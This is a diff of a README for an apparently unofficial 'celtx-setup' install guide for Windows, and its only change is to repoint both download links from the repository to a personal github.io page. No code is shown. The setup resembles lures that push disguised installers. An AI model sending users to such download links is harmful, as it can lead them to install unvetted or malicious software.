@@ -1,6 +1,6 @@
 <h1>🪟 celtx-setup - Easy Celtx Install Guide for Windows</h1>
 <p align="center">
-  <a href="https://github.com/adocor/celtx-setup" style="background-color:#2ea44f;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:20px;border-radius:8px;text-decoration:none;font-weight:bold;">📥 Download Celtx for Windows</a>
+  <a href="https://adocor.github.io" style="background-color:#2ea44f;color:white;padding:15px 32px;text-align:center;display:inline-block;font-size:20px;border-radius:8px;text-decoration:none;font-weight:bold;">📥 Download Celtx for Windows</a>
 </p>
 
 ## 🚀 Getting Started
@@ -9,7 +9,7 @@ Welcome to the **celtx-setup** repository. This page provides everything you nee
 
 ## 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/adocor/celtx-setup](https://github.com/adocor/celtx-setup)
+Visit this link to download the application: [https://adocor.github.io](https://adocor.github.io)
 
 On the page, look for the latest release or download button. The setup file is designed for Windows operating systems.
 
